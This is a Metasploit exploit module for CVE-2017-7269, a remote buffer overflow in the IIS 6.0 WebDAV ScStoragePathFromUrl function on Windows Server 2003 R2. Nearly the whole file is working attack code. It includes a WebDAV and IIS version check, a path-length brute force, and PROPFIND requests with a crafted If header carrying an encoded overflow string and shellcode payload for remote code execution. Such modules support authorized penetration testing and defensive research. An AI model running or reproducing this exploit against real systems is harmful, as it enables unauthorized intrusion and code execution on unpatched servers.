##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => ' Microsoft IIS WebDav ScStoragePathFromUrl Overflow',
      'Description'    => %q{
          Buffer overflow in the ScStoragePathFromUrl function
          in the WebDAV service in Internet Information Services (IIS) 6.0
          in Microsoft Windows Server 2003 R2 allows remote attackers to
          execute arbitrary code via a long header beginning with
          "If: <http://" in a PROPFIND request, as exploited in the
          wild in July or August 2016.

          Original exploit by Zhiniang Peng and Chen Wu.
      },
      'Author'         =>
        [
        'Zhiniang Peng', # Original author
        'Chen Wu',       # Original author
        'Dominic Chell <dominic@mdsec.co.uk>', # metasploit module
        'firefart', # metasploit module
        'zcgonvh <zcgonvh@qq.com>', # metasploit module
        'Rich Whitcroft' # metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2017-7269' ],
          [ 'BID', '97127' ],
          [ 'URL', 'https://github.com/edwardz246003/IIS_exploit' ],
          [ 'URL', 'https://0patch.blogspot.com/2017/03/0patching-immortal-cve-2017-7269.html' ]
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'         => 2000,
          'BadChars'      => "\x00",
          'EncoderType'   => Msf::Encoder::Type::AlphanumUnicodeMixed,
          'DisableNops'   =>  'True',
          'EncoderOptions' =>
            {
              'BufferRegister' => 'ESI',
            }
        },
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
          'PrependMigrate' => true,
        },
      'Targets'        =>
        [
          [
            'Microsoft Windows Server 2003 R2 SP2',
            {
              'Platform' => 'win',
            },
          ],
        ],
      'Platform'       => 'win',
      'DisclosureDate' => 'Mar 26 2017',
      'DefaultTarget' => 0))

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'Path of IIS 6 web application', '/']),
        OptInt.new('MINPATHLENGTH', [ true, 'Start of physical path brute force', 3 ]),
        OptInt.new('MAXPATHLENGTH', [ true, 'End of physical path brute force', 60 ]),
      ])
  end

  def min_path_len
    datastore['MINPATHLENGTH']
  end

  def max_path_len
    datastore['MAXPATHLENGTH']
  end

  def supports_webdav?(headers)
    if headers['MS-Author-Via'] == 'DAV' ||
       headers['DASL'] == '<DAV:sql>' ||
       headers['DAV'] =~ /^[1-9]+(,\s+[1-9]+)?$/ ||
       headers['Public'] =~ /PROPFIND/ ||
       headers['Allow'] =~ /PROPFIND/
      return true
    else
      return false
    end
  end

  def check
    res = send_request_cgi({
      'uri' => target_uri.path,
      'method' => 'OPTIONS'
    })
    if res && res.headers['Server'].include?('IIS/6.0') && supports_webdav?(res.headers)
      return Exploit::CheckCode::Vulnerable
    elsif res && supports_webdav?(res.headers)
      return Exploit::CheckCode::Detected
    elsif res.nil?
      return Exploit::CheckCode::Unknown
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    # extract the local servername and port from a PROPFIND request
    # these need to be the values from the backend server
    # if testing a reverse proxy setup, these values differ
    # from RHOST and RPORT but can be extracted this way
    vprint_status("Extracting ServerName and Port")
    res = send_request_raw(
      'method' => 'PROPFIND',
      'headers' => {
        'Content-Length' => 0
      },
      'uri' => target_uri.path
    )
    fail_with(Failure::BadConfig, "Server did not respond correctly to WebDAV request") if(res.nil? || res.code != 207)

    xml = res.get_xml_document
    url = URI.parse(xml.at("//a:response//a:href").text)
    server_name = url.hostname
    server_port = url.port
    server_scheme = url.scheme

    http_host = "#{server_scheme}://#{server_name}:#{server_port}"
    vprint_status("Using http_host #{http_host}")

    min_path_len.upto(max_path_len) do |path_len|
      vprint_status("Trying path length of #{path_len}...")

      begin
        buf1 = "<#{http_host}/"
        buf1 << rand_text_alpha(114 - path_len)
        buf1 << "\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac"
        buf1 << ">"
        buf1 << " (Not <locktoken:write1>) <#{http_host}/"
        buf1 << rand_text_alpha(114 - path_len)
        buf1 << "\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81"
        buf1 << payload.encoded
        buf1 << ">"

        vprint_status("Sending payload")
        res = send_request_raw(
          'method' => 'PROPFIND',
          'headers' => {
            'Content-Length' => 0,
            'If' => "#{buf1}"
          },
          'uri' => target_uri.path
        )
        if res
          vprint_status("Server returned status #{res.code}")
          if res.code == 502 || res.code == 400
            next
          elsif session_created?
            return
          else
            vprint_status("Unknown Response: #{res.code}")
          end
        end
      rescue ::Errno::ECONNRESET
        vprint_status("got a connection reset")
        next
      end
    end
  end
end
